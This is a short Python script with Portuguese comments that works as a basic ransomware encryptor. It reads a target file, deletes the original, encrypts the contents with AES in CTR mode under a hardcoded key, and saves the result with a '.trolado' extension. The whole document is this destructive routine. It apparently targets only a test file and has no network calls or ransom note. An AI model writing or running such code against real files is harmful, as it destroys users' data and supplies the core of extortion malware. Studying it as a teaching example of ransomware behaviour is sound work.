import os
import pyaes

#abrindo arquivo alvo

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#removendo o arquivo alvo original

os.remove(file_name)

#chave de criptografia de 16 caracteres

key = b'0123456789ABCDEF'
aes = pyaes.AESModeOfOperationCTR(key)

#criptografia

crypto_data = aes.encrypt(file_data)

#salvando o arquivo criptografado
new_file = file_name + '.trolado'
new_file = open (f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
